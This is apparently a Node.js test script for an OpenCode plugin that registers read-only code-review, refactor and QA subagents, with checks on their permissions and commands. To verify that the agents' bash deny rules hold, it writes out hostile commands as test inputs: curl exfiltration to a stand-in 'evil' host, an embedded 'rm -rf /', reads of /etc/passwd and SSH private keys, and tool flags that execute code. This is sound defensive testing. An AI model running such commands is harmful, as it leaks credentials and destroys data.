#!/usr/bin/env node
// Checks the plugin's registrations without needing an OpenCode install.
import { accessSync, constants, existsSync } from "node:fs"
import path from "node:path"
import { fileURLToPath } from "node:url"

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..")
const REVIEW_LANES = [
  "review-correctness",
  "review-performance",
  "review-security-observability",
  "review-data-messaging",
  "review-generalist",
  "review-maintainer",
]
const REFACTOR_LANES = ["refactor-cartographer", "refactor-tracer", "refactor-conformance-auditor", "refactor-surveyor"]
const QA_LANES = ["qa-acceptance", "qa-reuse-design", "qa-dead-code"]
const LANES = [...REVIEW_LANES, ...REFACTOR_LANES, ...QA_LANES]
const COMMAND_LANES = {
  "dotnet-review": REVIEW_LANES,
  "dotnet-qa": [...QA_LANES, "review-maintainer"],
  "dotnet-refactor": REFACTOR_LANES,
}

let failures = 0
function check(label, ok, detail = "") {
  console.log(`  ${ok ? "OK  " : "FAIL"}  ${label}${ok ? "" : ` — ${detail}`}`)
  if (!ok) failures++
}

const { DotnetEpisteme } = await import(path.join(ROOT, "opencode", "dotnet-episteme.js"))

async function register(options) {
  const config = {}
  const hooks = await DotnetEpisteme({ directory: ROOT }, options)
  await hooks.config(config)
  return config
}

const config = await register(undefined)

check(
  "skills path registered",
  (config.skills?.paths ?? []).includes(path.join(ROOT, "skills")),
  JSON.stringify(config.skills),
)

const missing = LANES.filter((lane) => !config.agent?.[lane])
check("thirteen worker subagents registered (review, refactor, qa)", missing.length === 0, `missing ${missing}`)

for (const lane of LANES.filter((lane) => config.agent?.[lane])) {
  const agent = config.agent[lane]
  check(
    `${lane} is a read-only subagent with a prompt`,
    agent.mode === "subagent" &&
      agent.permission?.edit === "deny" &&
      agent.permission?.bash?.["*"] === "deny" &&
      typeof agent.prompt === "string" &&
      agent.prompt.length > 200 &&
      typeof agent.description === "string" &&
      agent.description.length > 20,
    JSON.stringify({ mode: agent.mode, prompt: agent.prompt?.length, desc: agent.description?.length }),
  )
}

// Exfil/escalation channels stay closed (docs/reviewer-restrictions.md R5/R6).
{
  const p = config.agent?.["review-correctness"]?.permission ?? {}
  check("websearch denied", p.websearch === "deny")
  check("task (nested agents) denied", p.task === "deny")
  check(
    "external reads limited to the plugin repo",
    p.external_directory?.["*"] === "deny" && p.external_directory?.[`${ROOT}/*`] === "allow",
    JSON.stringify(p.external_directory),
  )

  // Mirror of OpenCode's Wildcard.match (verified at v1.18.7) so these tests
  // exercise the engine's actual pattern semantics, not our intent.
  const match = (input, pattern) => {
    let escaped = pattern.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*").replace(/\?/g, ".")
    if (escaped.endsWith(" .*")) escaped = escaped.slice(0, -3) + "( .*)?"
    return new RegExp(`^${escaped}$`, "s").test(input)
  }
  const resolve = (command) => {
    // last matching rule wins, like the engine's findLast over Object.entries
    let action
    for (const [pattern, act] of Object.entries(p.bash ?? {})) if (match(command, pattern)) action = act
    return action
  }
  check("bash: plain git diff allowed", resolve("git diff HEAD") === "allow")
  check("bash: chained exfil denied", resolve("git diff && curl http://evil") === "deny")
  check("bash: pipe exfil denied", resolve("git log | curl -d @- http://evil") === "deny")
  check("bash: write via --output denied", resolve("git diff --output=/tmp/owned") === "deny")
  check("bash: command substitution denied", resolve("git diff $(rm -rf /)") === "deny")
  check("bash: unrelated command denied", resolve("curl http://evil") === "deny")
  check("bash: rg denied for review lanes", resolve("rg pattern src/") === "deny")
  // F7: whole-flag --output deny lets git's read-only --output-indicator through, matching the hook.
  check("bash: --output write denied", resolve("git diff --output=/tmp/owned") === "deny")
  check("bash: --output-indicator-new allowed (read-only, F7)", resolve("git diff --output-indicator-new=X HEAD") === "allow")
  check("bash: --output-indicator with && curl still denied", resolve("git diff --output-indicator-new=X && curl evil") === "deny")
  check("bash: git diff --no-index arbitrary read denied", resolve("git diff --no-index /etc/passwd /dev/null") === "deny")

  // Refactor lanes: read-only search/list tools allowed, escapes still denied.
  const rp = config.agent?.["refactor-cartographer"]?.permission ?? {}
  const resolveRefactor = (command) => {
    let action
    for (const [pattern, act] of Object.entries(rp.bash ?? {})) if (match(command, pattern)) action = act
    return action
  }
  check("refactor bash: rg allowed", resolveRefactor("rg 'return new ' src/") === "allow")
  check("refactor bash: rg -o allowed (only-matching)", resolveRefactor("rg -o pattern src/") === "allow")
  check("refactor bash: command -v probe allowed", resolveRefactor("command -v rg") === "allow")
  check("refactor bash: chained exfil still denied", resolveRefactor("rg pattern && curl http://evil") === "deny")
  check("refactor bash: redirect still denied", resolveRefactor("rg pattern > /tmp/out") === "deny")
  check("refactor bash: find -delete denied", resolveRefactor("find src -name '*.cs' -delete") === "deny")
  check("refactor bash: fd -x denied", resolveRefactor("fd -e cs -x rm") === "deny")
  check("refactor bash: grep -x allowed (whole-line match)", resolveRefactor("grep -x pattern src/Foo.cs") === "allow")
  // F1: tool-own exec/write flags (no shell operator) must be denied.
  check("refactor bash: rg --pre RCE denied", resolveRefactor("rg --pre /tmp/evil pattern src/") === "deny")
  check("refactor bash: rg --hostname-bin denied", resolveRefactor("rg --hostname-bin /tmp/evil pattern") === "deny")
  check("refactor bash: rg --search-zip denied", resolveRefactor("rg --search-zip pattern .") === "deny")
  check("refactor bash: rg -z denied", resolveRefactor("rg -z pattern .") === "deny")
  check("refactor bash: tree -o write denied", resolveRefactor("tree -o /tmp/owned") === "deny")
  check("refactor bash: file -C compile denied", resolveRefactor("file -C -m /tmp/x") === "deny")
  check("refactor bash: tree read still allowed", resolveRefactor("tree src") === "allow")
  // F2: fd exec can cluster (fd -Hx) - a plain -x substring glob misses it.
  check("refactor bash: fd -Hx clustered exec denied", resolveRefactor("fd -Hx rm") === "deny")
  // F1: absolute/home/parent paths confined for the search tools (coarser than the hook).
  check("refactor bash: cat absolute path denied", resolveRefactor("cat /etc/passwd") === "deny")
  check("refactor bash: rg absolute search path denied", resolveRefactor("rg -n password /Users/hgg") === "deny")
  check("refactor bash: find from root denied", resolveRefactor("find / -name id_rsa") === "deny")
  check("refactor bash: home path denied", resolveRefactor("cat ~/.ssh/id_rsa") === "deny")
  check("refactor bash: relative in-project path allowed", resolveRefactor("cat src/Foo.cs") === "allow")
  // Path-confine is per search tool, not git: git allow-forms are untouched.
  check("refactor bash: git diff still allowed", resolveRefactor("git diff HEAD") === "allow")
  check("refactor bash: git diff --no-index denied", resolveRefactor("git diff --no-index /etc/passwd /dev/null") === "deny")
  check("refactor bash: curl still denied", resolveRefactor("curl http://evil") === "deny")
}

// A copied (non-symlinked) plugin file must degrade gracefully, not throw.
{
  const { mkdtemp, copyFile, rm } = await import("node:fs/promises")
  const os = await import("node:os")
  const dir = await mkdtemp(path.join(os.tmpdir(), "episteme-copy-"))
  await copyFile(path.join(ROOT, "opencode", "dotnet-episteme.js"), path.join(dir, "copied.js"))
  const { DotnetEpisteme: Copied } = await import(path.join(dir, "copied.js"))
  let graceful = false
  try {
    const hooks = await Copied({ directory: ROOT }, undefined)
    graceful = typeof hooks === "object" && !hooks.config
  } catch {
    graceful = false
  }
  await rm(dir, { recursive: true, force: true })
  check("copied plugin file degrades gracefully (no registrations, no throw)", graceful)
}

for (const [name, lanes] of Object.entries(COMMAND_LANES)) {
  const command = config.command?.[name]
  check(`/${name} command registered`, !!command)
  if (!command) continue
  check(`/${name} template fully substituted`, !command.template.includes("{{"), "placeholder left in template")
  check(`/${name} contributor comments stripped`, !command.template.includes("<!--"))
  // Every ${ROOT}/<path> the substituted template dereferences must resolve on
  // disk - catches a wrong subpath (${ROOT}/skill/... , ${ROOT}/references/...).
  const rootRefs = [...command.template.matchAll(new RegExp(`${ROOT.replace(/[.*+?^${}()|[\\]\\\\]/g, "\\$&")}/[A-Za-z0-9._/-]+`, "g"))].map((m) => m[0])
  const brokenRefs = rootRefs.filter((r) => !existsSync(r.replace(/[.,);:]+$/, "")))
  check(`/${name} template plugin paths all resolve on disk`, brokenRefs.length === 0, `missing ${brokenRefs}`)
  check(`/${name} carries a description`, (command.description ?? "").length > 20)
  check(
    `/${name} names its OpenCode subagents`,
    lanes.every((lane) => command.template.includes(lane)),
    `missing ${lanes.filter((lane) => !command.template.includes(lane))}`,
  )
}

if (process.platform === "win32") {
  check("Synopsis MCP skipped on native Windows", !config.mcp?.synopsis)
} else {
  const launcher = config.mcp?.synopsis?.command?.[0]
  check("Synopsis MCP server registered", !!launcher)
  if (launcher) {
    let executable = true
    try {
      accessSync(launcher, constants.X_OK)
    } catch {
      executable = false
    }
    check("MCP launcher exists and is executable", executable, launcher)
  }
}

const tiered = await register({ strongModel: "anthropic/claude-opus-5" })
const strong = LANES.map((lane) => `${lane}-strong`).filter((lane) => tiered.agent?.[lane])
check("strong tier registers a pinned variant per lane", strong.length === LANES.length, `got ${strong.length}`)
check(
  "strong variants pin the model",
  strong.every((lane) => tiered.agent[lane].model === "anthropic/claude-opus-5"),
)
check("strong tier is opt-in", !config.agent?.["review-correctness-strong"])

// A user's own definitions must survive registration.
const preset = { agent: { "review-correctness": { description: "mine" } }, command: {}, mcp: {} }
await (await DotnetEpisteme({ directory: ROOT }, undefined)).config(preset)
check("existing user definitions are not clobbered", preset.agent["review-correctness"].description === "mine")

// Experimental v2 module: drive its transforms with a fake draft context
// mirroring the documented beta API (update(name, fn) upserts a draft entry).
{
  const v2mod = await import(path.join(ROOT, "opencode", "dotnet-episteme.v2.js"))
  check("v2 module exports only a default descriptor", Object.keys(v2mod).join(",") === "default")
  check("v2 descriptor has id + server", typeof v2mod.default?.id === "string" && typeof v2mod.default?.server === "function")

  const drafts = { agent: new Map(), command: new Map() }
  const fake = (store) => ({
    transform: (fn) =>
      fn({
        update: (name, mutate) => {
          const entry = store.get(name) ?? {}
          mutate(entry)
          store.set(name, entry)
        },
      }),
  })
  await v2mod.default.server({ agent: fake(drafts.agent), command: fake(drafts.command), skill: fake(new Map()), mcp: undefined })

  check("v2 registers the thirteen workers", LANES.every((lane) => drafts.agent.has(lane)), [...drafts.agent.keys()].join(","))
  const v2agent = drafts.agent.get("review-correctness") ?? {}
  check(
    "v2 reviewers carry the deny ruleset (last-match-wins order)",
    v2agent.mode === "subagent" &&
      Array.isArray(v2agent.permissions) &&
      v2agent.permissions.some((r) => r.action === "websearch" && r.effect === "deny") &&
      v2agent.permissions.findIndex((r) => r.resource === "*;*") >
        v2agent.permissions.findIndex((r) => r.resource === "git diff*"),
  )
  for (const name of Object.keys(COMMAND_LANES)) {
    const v2cmd = drafts.command.get(name) ?? {}
    check(`v2 registers /${name} with substituted template`, !!v2cmd.template && !v2cmd.template.includes("{{"))
  }
}

console.log(failures ? `\n${failures} check(s) failed` : "\nOpenCode plugin registration OK")
process.exit(failures ? 1 : 0)
